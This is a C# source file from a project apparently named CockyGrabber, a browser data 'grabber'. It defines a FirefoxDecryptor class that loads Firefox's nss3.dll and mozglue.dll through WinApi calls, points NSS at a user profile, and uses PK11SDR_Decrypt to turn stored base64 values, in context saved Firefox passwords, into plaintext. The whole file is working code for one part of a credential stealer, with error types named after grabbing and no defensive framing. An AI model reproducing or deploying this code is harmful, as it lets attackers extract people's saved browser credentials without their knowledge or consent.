/*
    Coded by github.com/0xPh0enix
*/
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace CockyGrabber.Utility
{
    internal sealed class WinApi
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr LoadLibrary(string sFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string sProcName);
    }
    internal sealed class Nss3
    {
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string sDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11SdrDecrypt(ref TSECItem tsData, ref TSECItem tsResult, int iContent);
    }
    public static class FirefoxDecryptor
    {
        private static IntPtr hNss3;
        private static IntPtr hMozGlue;

        private static Nss3.NssInit fpNssInit;
        private static Nss3.Pk11SdrDecrypt fpPk11SdrDecrypt;
        private static Nss3.NssShutdown fpNssShutdown;

        private const string MozGlueDll = "\\mozglue.dll";
        private const string NssDll = "\\nss3.dll";

        /// <summary>
        /// Load libraries and functions for firefox value decryption
        /// </summary>
        /// <param name="mozillaPath">Mozilla Firefox folder path in ProgramFiles</param>
        /// <returns>True if everything was successful</returns>
        public static bool LoadNSS(string mozillaPath)
        {
            if (!File.Exists(mozillaPath + MozGlueDll)) // Check If DLL Exists
                throw new GrabberException(GrabberError.Nss3NotFound, $"MozGlue was not found: {mozillaPath + MozGlueDll}");

            if (!File.Exists(mozillaPath + NssDll)) // Check If DLL Exists
                throw new GrabberException(GrabberError.Nss3NotFound, $"NSS3 was not found: {mozillaPath + NssDll}");

            if (!Environment.Is64BitProcess)
                throw new GrabberException(GrabberError.ProcessIsNot64Bit, "The current process is 32-bit! To decrypt firefox values it needs to be 64-bit");

            // Load libraries with the WinApi:
            hMozGlue = WinApi.LoadLibrary(mozillaPath + MozGlueDll); // This is necessary to make Nss3 work
            hNss3 = WinApi.LoadLibrary(mozillaPath + NssDll);

            // Check if both libraries were loaded successfully:
            if (hMozGlue == IntPtr.Zero)
                throw new GrabberException(GrabberError.MozGlueNotFound, $"{MozGlueDll} could not be found: {mozillaPath + MozGlueDll}");
            if (hNss3 == IntPtr.Zero)
                throw new GrabberException(GrabberError.Nss3NotFound, $"{NssDll} could not be found: {mozillaPath + NssDll}");

            // Get adresses of functions:
            IntPtr ipNssInitAddr = WinApi.GetProcAddress(hNss3, "NSS_Init"); // NSS_Init()
            IntPtr ipNssPk11SdrDecrypt = WinApi.GetProcAddress(hNss3, "PK11SDR_Decrypt"); // PK11SDR_Decrypt()
            IntPtr ipNssShutdown = WinApi.GetProcAddress(hNss3, "NSS_Shutdown"); // NSS_Shutdown()

            // Check if all addresses were found:
            if (ipNssInitAddr == IntPtr.Zero)
                throw new GrabberException(GrabberError.AddressNotFound, $"Process Address of NSS_Init was not found!");
            if (ipNssPk11SdrDecrypt == IntPtr.Zero)
                throw new GrabberException(GrabberError.AddressNotFound, $"Process Address of PK11SDR_Decrypt was not found!");
            if (ipNssShutdown == IntPtr.Zero)
                throw new GrabberException(GrabberError.AddressNotFound, $"Process Address of NSS_Shutdown was not found!");

            // Get Delegates from function pointers:
            fpNssInit = (Nss3.NssInit)Marshal.GetDelegateForFunctionPointer(ipNssInitAddr, typeof(Nss3.NssInit)); // NSS_Init()
            fpPk11SdrDecrypt = (Nss3.Pk11SdrDecrypt)Marshal.GetDelegateForFunctionPointer(ipNssPk11SdrDecrypt, typeof(Nss3.Pk11SdrDecrypt)); // PK11SDR_Decrypt()
            fpNssShutdown = (Nss3.NssShutdown)Marshal.GetDelegateForFunctionPointer(ipNssShutdown, typeof(Nss3.NssShutdown)); // NSS_Shutdown()

            // Check if all functions were found:
            if (fpNssInit == null)
                throw new GrabberException(GrabberError.FunctionNotFound, $"Function 'NSS_Init()' was not found!");
            if (fpPk11SdrDecrypt == null)
                throw new GrabberException(GrabberError.FunctionNotFound, $"Function 'PK11SDR_Decrypt()' was not found!");
            if (fpNssShutdown == null)
                throw new GrabberException(GrabberError.FunctionNotFound, $"Function 'NSS_Shutdown()' was not found!");

            if (fpNssInit != null && fpPk11SdrDecrypt != null && fpNssShutdown != null) // If all functions were found:
                return true;
            else
                return false;
        }

        /// <summary>
        /// Free Libraries and close Nss3
        /// </summary>
        public static void UnLoadNSS()
        {
            fpNssShutdown();
            WinApi.FreeLibrary(hNss3);
            WinApi.FreeLibrary(hMozGlue);
        }

        /// <summary>
        /// Sets firefox profile
        /// </summary>
        /// <param name="path">Path to the firefox profile</param>
        /// <returns>True if set successfully</returns>
        public static bool SetProfile(string path) => fpNssInit(path) == 0;

        /// <summary>
        /// Decrypt a encrypted value with Nss3
        /// </summary>
        /// <param name="value">The encrypted value</param>
        /// <returns>The decrypted value or null if decryption was unsuccessful</returns>
        public static string DecryptValue(string value)
        {
            IntPtr lpMemory = IntPtr.Zero;

            try
            {
                byte[] bPassDecoded = Convert.FromBase64String(value); // String from Base64

                lpMemory = Marshal.AllocHGlobal(bPassDecoded.Length); // Allocate some memory
                Marshal.Copy(bPassDecoded, 0, lpMemory, bPassDecoded.Length); // copy the data of bPassDecoded to lpMemory

                Nss3.TSECItem tsiOut = new Nss3.TSECItem();
                Nss3.TSECItem tsiItem = new Nss3.TSECItem
                {
                    SECItemType = 0,
                    SECItemData = lpMemory,
                    SECItemLen = bPassDecoded.Length
                };

                if (fpPk11SdrDecrypt(ref tsiItem, ref tsiOut, 0) == 0) // If Decrypted successfully
                {
                    if (tsiOut.SECItemLen != 0)
                    {
                        byte[] bDecrypted = new byte[tsiOut.SECItemLen]; // Create a byte array and make space for the data
                        Marshal.Copy(tsiOut.SECItemData, bDecrypted, 0, tsiOut.SECItemLen); // copy tsiOut.SECItemData to bDecrypted

                        return Encoding.UTF8.GetString(bDecrypted);
                    }
                }
            }
            catch (Exception ex)
            {
                throw new GrabberException(GrabberError.UnknownError, ex.ToString());
            }
            finally
            {
                if (lpMemory != IntPtr.Zero)
                    Marshal.FreeHGlobal(lpMemory); // Free the allocated memory
            }
            return null;
        }

        // useless:
        public static string GetUTF8(string sNonUtf8)
        {
            try
            {
                byte[] bData = Encoding.Default.GetBytes(sNonUtf8);
                return Encoding.UTF8.GetString(bData);
            }
            catch { return sNonUtf8; }
        }
    }
}